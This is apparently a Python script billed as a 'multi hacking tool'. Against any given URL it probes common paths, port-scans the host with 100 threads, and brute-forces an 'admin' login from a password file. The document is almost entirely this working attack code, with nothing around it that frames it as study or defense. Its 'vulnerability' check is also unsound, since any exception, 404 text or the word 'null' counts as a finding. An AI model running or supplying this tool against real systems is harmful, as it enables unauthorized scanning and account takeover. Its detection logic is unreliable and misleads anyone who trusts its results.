#!/usr/bin/python3
"""
Kaito001 - Multi Hacking Tool
"""

import requests
import time
import sys
import random
import string
import socket
import threading
import concurrent.futures
import validators

def check_vulnerabilities(target_url):
    """Check for common vulnerabilities in a web application"""
    
    # Validate URL before processing
    if not validators.url(target_url):
        print(f"[!] Invalid URL: {target_url}")
        return False
    
    # List of common vulnerabilities
    vulnerabilities = [
        "/admin", "/login", "/password", "/reset", "/forgot",
        "/upload", "/download", "/search", "/api", "/debug"
    ]
    
    vulnerable = False
    
    # Check each vulnerability pattern
    for vuln in vulnerabilities:
        try:
            response = requests.get(target_url + vuln, timeout=3)
            
            # Check for error messages that might reveal vulnerabilities
            error_indicators = [
                "error", "exception", "stack trace", "sql", "syntax",
                "undefined", "null", "undefined", "not found", "404", "500"
            ]
            
            # Check if error indicators appear in response
            for indicator in error_indicators:
                if indicator in response.text.lower():
                    vulnerable = True
                    print(f"[+] Potential vulnerability found: {vuln}")
            
            # Check response status code
            if response.status_code >= 500:
                vulnerable = True
                print(f"[+] Server error vulnerability: {vuln}")
                
        except Exception as e:
            vulnerable = True
            print(f"[+] Exception vulnerability: {vuln} - {str(e)}")
    
    return vulnerable

def port_scan(target_ip, start_port, end_port):
    """Scan ports for open services"""
    open_ports = []
    
    def check_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    return port
        except:
            pass
        return None
    
    # Use ThreadPoolExecutor for concurrent port scanning
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_port, port) for port in range(start_port, end_port + 1)]
        for future in concurrent.futures.as_completed(futures):
            if result := future.result():
                open_ports.append(result)
    
    return open_ports

def brute_force_login(target_url, username, password_list, max_workers=5):
    """Attempt to brute force login"""
    
    def try_login(password):
        try:
            # Simulate login request
            response = requests.post(
                f"{target_url}?login=true",
                data={
                    "username": username,
                    "password": password
                },
                timeout=3
            )
            
            # Check if login was successful
            if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                return password
                
        except Exception as e:
            print(f"[!] Error during login attempt: {str(e)}")
    
    # Use ThreadPoolExecutor for concurrent attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_login, password) for password in password_list]
        for future in concurrent.futures.as_completed(futures):
            if result := future.result():
                return result
    
    return None

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 kaito.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL before processing
    if not validators.url(target_url):
        print(f"[!] Invalid URL: {target_url}")
        sys.exit(1)
    
    # Check for vulnerabilities
    vulnerable = check_vulnerabilities(target_url)
    
    # Scan ports if web service is detected
    if vulnerable or "http" in target_url:
        try:
            hostname = socket.gethostbyname(target_url.split("//")[1].split("/")[0])
            print(f"[*] Starting port scan on {hostname}")
            open_ports = port_scan(hostname, 1, 1024)
            
            if open_ports:
                print(f"[+] Found open ports: {', '.join(map(str, open_ports))}")
            else:
                print("[-] No obvious open ports detected")
                
        except Exception as e:
            print(f"[!] Error during port scan: {str(e)}")
    
    # Attempt brute force login if credentials are known
    username = "admin"
    password_file = "passwords.txt"
    
    try:
        with open(password_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if passwords:
            print(f"[*] Starting brute force attack with {len(passwords)} passwords")
            correct_password = brute_force_login(target_url, username, passwords)
            
            if correct_password:
                print(f"[+] Found valid credentials: {username}:{correct_password}")
            else:
                print("[-] Brute force attack completed without success")
    
    except FileNotFoundError:
        print(f"[!] Password file '{password_file}' not found")
    
    # Report findings
    if vulnerable:
        print("[+] Target appears vulnerable!")
    else:
        print("[-] No obvious vulnerabilities detected.")

if __name__ == "__main__":
    main()
